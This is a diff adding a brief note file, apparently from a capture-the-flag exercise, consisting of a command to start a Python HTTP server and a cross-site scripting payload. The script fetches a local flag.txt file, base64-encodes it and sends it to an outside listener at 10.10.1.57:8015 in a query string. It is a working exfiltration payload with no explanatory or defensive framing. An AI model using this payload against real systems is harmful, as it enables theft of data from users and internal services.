@@ -1,0 +1,17 @@
+
+====================================================
+python3.9 -m http.server
+-----------------
+base64:
+
+<script>
+fetch('http://127.0.0.1:8080/flag.txt')
+  .then(response => response.text())
+  .then(data => {
+    window.open(`http://10.10.1.57:8015?flag=${btoa(data)}`, '_blank');
+  });
+</script>
+
+
+
+
